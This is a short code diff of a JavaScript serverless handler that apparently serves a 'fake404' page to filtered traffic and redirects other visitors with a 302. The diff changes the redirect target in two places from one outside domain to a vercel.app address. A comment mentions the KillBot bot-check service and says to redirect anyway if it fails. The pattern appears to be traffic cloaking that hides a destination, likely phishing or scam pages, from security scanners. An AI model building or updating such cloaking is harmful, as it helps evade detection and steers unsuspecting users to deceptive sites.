@@ -52,7 +52,7 @@ export default async function handler(req, res) {
       
       return res.status(404).send(fake404);
     } else {
-      res.writeHead(302, { Location: 'https://maurpie.com' });
+      res.writeHead(302, { Location: 'https://misas.vercel.app' });
       return res.end();
     }
   } catch (err) {
@@ -66,7 +66,7 @@ export default async function handler(req, res) {
     });
     
     // En cas d'erreur avec KillBot, rediriger quand même pour éviter de bloquer l'utilisateur
-    res.writeHead(302, { Location: 'https://maurpie.com' });
+    res.writeHead(302, { Location: 'https://misas.vercel.app' });
     return res.end();
   }
 }
